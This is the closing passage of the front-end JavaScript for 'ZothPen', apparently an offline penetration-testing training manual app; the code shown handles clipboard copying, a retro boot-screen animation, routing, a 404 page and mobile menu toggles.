    case 'forgelang': if (ZO.filterForgeLang) ZO.filterForgeLang(id || ''); break;
  }
});
function copyRaw(text) {
  const done = () => say('copied: ' + String(text).slice(0, 40), 'ok');
  if (navigator.clipboard && navigator.clipboard.writeText) navigator.clipboard.writeText(text).then(done, () => fallbackCopy(text, done));
  else fallbackCopy(text, done);
}
function fallbackCopy(text, done) {
  const ta = document.createElement('textarea');
  ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
  document.body.appendChild(ta); ta.select();
  try { document.execCommand('copy'); done(); } catch (e) { toast('copy failed — select it manually', 'err'); }
  ta.remove();
}

/* ------------------------------------------------------------------ *
 * 15. boot
 * ------------------------------------------------------------------ */
const BOOT = [
  'ZothPen BIOS v4.20 — phosphor terminal, offline build',
  'cpu .... okay        mem .... 640K conventional / 8M extended',
  'crt layers .... panel / scanlines / grille+vignette  [3 of 3]',
  'bus scan ...................................... [ ok ]',
  'mounting /dev/knowledge ....................... [ ok ]',
  'indexing arsenal .............................. [ ' + ZT.length + ' dossiers ]',
  'loading field manual .......................... [ ' + ZM.length + ' modules / ' + ZL.length + ' labs / ' + ZD.length + ' drills ]',
  'loading forge ................................. [ ' + ZF.length + ' recipes ]',
  'indexing shell ................................ [ ' + ZX.length + ' commands ]',
  'authorisation check ........................... [ ATTENTION ] read module 00 first',
  'select * from clues where xp > 0 .............. [ 0 rows ] build them yourself',
  'launching zoth@zothpen ......................... [ ok ]'
];
function boot(done) {
  const box = $('#boot'), pre = $('#boottext');
  const fast = !S.tweaks.motion || (window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches);
  let i = 0;
  const finish = () => {
    box.hidden = true;
    $('#app').hidden = false;
    try { sessionStorage.setItem('zothpen.booted', '1'); } catch (e) {}
    done();
  };
  $('#bootskip').onclick = finish;
  if (fast) { pre.textContent = BOOT.join('\n') + '\n\nzoth@zothpen:~$ '; return finish(); }
  const step = () => {
    if (i >= BOOT.length) {
      pre.textContent += '\nzoth@zothpen:~$ ';
      setTimeout(finish, 260);
      return;
    }
    pre.textContent += BOOT[i] + '\n';
    i++;
    setTimeout(step, i < 4 ? 90 : 55);
  };
  step();
}

/* ------------------------------------------------------------------ *
 * 16. start
 * ------------------------------------------------------------------ */
ZO.render = render; ZO.go = go; ZO.say = say; ZO.toast = toast;
ZO.state = () => S; ZO.$$ = $$; ZO.$ = $;
ZO.openPalette = openPalette; ZO.closePalette = closePalette; ZO.viewNameFor = viewNameFor;
ZO.md = md; ZO.inline = inline; ZO.codeBlock = codeBlock; ZO.note = note; ZO.esc = esc; ZO.attr = attr;
ZO.diffTag = diffTag; ZO.kindTag = kindTag; ZO.chip = chip; ZO.bar = bar; ZO.meter = meter;
ZO.crumbs = crumbs; ZO.rule = rule; ZO.empty = empty; ZO.stats = stats; ZO.save = save;
ZO.recordDrill = recordDrill; ZO.nextUp = nextUp; ZO.slug = slug; ZO.toolOf = toolOf;
ZO.views.notfound = function (r) {
  return crumbs([{ t: 'ZothPen', go: '/home' }, { t: r.name }]) +
    rule('404 / off map') + '<h1 class="h1">no route: ' + esc(r.name) + '</h1>' +
    '<p class="sub">That path is not part of the manual.</p>' +
    '<div class="grid g2">' +
    ZM.slice(0, 4).map((m, idx) => '<button class="card" data-act="go" data-hash="#/mod/' + m.id + '">' +
      (window.ZOPixelArt ? window.ZOPixelArt.getSceneFor(m.phase || m.id, idx) : '') +
      '<span class="t"><b>' + m.n + ' ' + esc(m.title) + '</b></span><span class="d">' + esc(m.blurb) + '</span></button>').join('') +
    '</div><p><button class="btn" data-act="go" data-hash="#/home">→ overview</button></p>';
};

ZO.start = function () {
  load();
  applyTweaks();
  wireTweaks();
  const pi = $('#paletteInput'); if (pi) pi.oninput = () => { palSel = 0; drawPalette(pi.value); };
  const pl = $('#paletteList'); if (pl) pl.onclick = (e) => { const li = e.target.closest('li[data-i]'); if (li) palActivate(+li.dataset.i); };
  $$('.overlay').forEach(o => { o.onclick = (e) => { if (e.target === o) o.hidden = true; }; });
  const pb = $('#paletteBtn'); if (pb) pb.onclick = openPalette;
  const tb = $('#tweakBtn'); if (tb) tb.onclick = () => { $('#tweaks').hidden = false; };

  // mobile toggles (CSS only shows these under 820px)
  const bar = $('#topbar');
  if (bar && !$('#menuBtn')) {
    const mb = document.createElement('button');
    mb.className = 'btn menubtn'; mb.id = 'menuBtn'; mb.textContent = '≡ map';
    mb.onclick = () => { $('#sidebar').classList.toggle('open'); $('#rail').classList.remove('open'); };
    bar.insertBefore(mb, bar.firstChild);
    const rb = document.createElement('button');
    rb.className = 'btn menubtn'; rb.id = 'railBtn'; rb.textContent = 'status';
    rb.onclick = () => { $('#rail').classList.toggle('open'); $('#sidebar').classList.remove('open'); };
    bar.appendChild(rb);
  }

  window.addEventListener('keydown', keys);
  let seen = null;
  try { seen = sessionStorage.getItem('zothpen.booted'); } catch (e) {}
  const begin = () => {
    if (!location.hash) location.hash = '#/home';
    render();
    const st = stats();
    say('welcome back, zoth. ' + st.lv.name + '.', 'ok');
  };
  if (seen || location.search.indexOf('noboot') > -1 || (location.hash && location.hash !== '#/home' && location.hash !== '#')) { $('#boot').hidden = true; $('#app').hidden = false; begin(); }
  else boot(begin);
};
window.addEventListener('hashchange', () => { S.route = location.hash; save(); render(); });

})();
